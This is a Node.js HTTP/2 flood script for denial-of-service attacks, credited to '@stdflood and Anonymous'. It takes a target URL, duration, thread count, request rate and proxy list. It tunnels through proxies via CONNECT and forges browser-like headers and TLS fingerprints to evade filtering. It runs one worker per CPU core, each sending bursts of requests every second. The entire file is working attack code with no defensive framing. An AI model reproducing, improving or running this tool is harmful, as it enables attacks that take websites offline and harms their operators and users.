/*
    dev && fixed ~~> @stdflood and Anonymous
*/

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");


process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
//console.log(exception)
});

if (process.argv.length < 7) { console.log(`[!] Usage: <URL> <TIME> <THREADS> <RATE> <PROXIES>`); process.exit(); }

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6]
}

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

const accept_header = [
    'application/json',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const lang_header = ["en-US,en;q=0.9",
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5", "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en-gb;q=0.8, en;q=0.7",
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    'en-GB,en;q=0.7',
    '*',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5',
    'da, en-gb;q=0.8, en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'tr',
    'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    "cs;q=0.5"
];

const encoding_header = ["gzip, deflate, br"];

const control_header = ["no-cache", "max-age=0", "no-cache, no-store, private, max-age=0, must-revalidate"];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512"; // sig[Math.floor(Math.floor(Math.random() * sig.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);



const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContextOptions = {
    ciphers: cipper,
    sigalgs: siga,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};


const secureContext = tls.createSecureContext(secureContextOptions);


const MAX_RAM_PERCENTAGE = 80; // Максимальный процент загрузки RAM
const RESTART_DELAY = 5000; // Задержка перед перезапуском скрипта (в миллисекундах)

if (cluster.isMaster) {
    // Получаем количество доступных ядер CPU
    const numCores = os.cpus().length;

    // Функция для перезапуска скрипта
    const restartScript = () => {
        // Убиваем все дочерние процессы (потоки)
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            // Запускаем потоки заново
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    // Обработчик события изменения загрузки RAM
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    // Запускаем обработчик события изменения загрузки RAM каждые 5 секунд
    setInterval(handleRAMUsage, 5000);

    // Запускаем потоки
    for (let counter = 1; counter <= numCores; counter++) {
        cluster.fork();
    }
} else {
    // Ваш код для выполнения в каждом потоке
    setInterval(runFlooder);
}


class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}


const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?lang" + "=" + lang;
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["cache-control"] = control;
headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["user-agent"] = randstr(12);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["TE"] = "trailers";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";


function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 5000,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            sigals: siga,
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "GREASE:x25519:secp256r1:secp384r1",
            host: parsedTarget.host,
            compression: true,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
            minVersion: 'TLSv1.2',
            secureContext: secureContext,
            honorCipherOrder: false, 
  					requestCert: true,
  					gzip: true,
  					allowHTTP1: true,
  					isServer: false,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        client.on("connect", () => {
        setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)

                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();
                }
                }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
    }), function (error, response, body) {
    };
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);
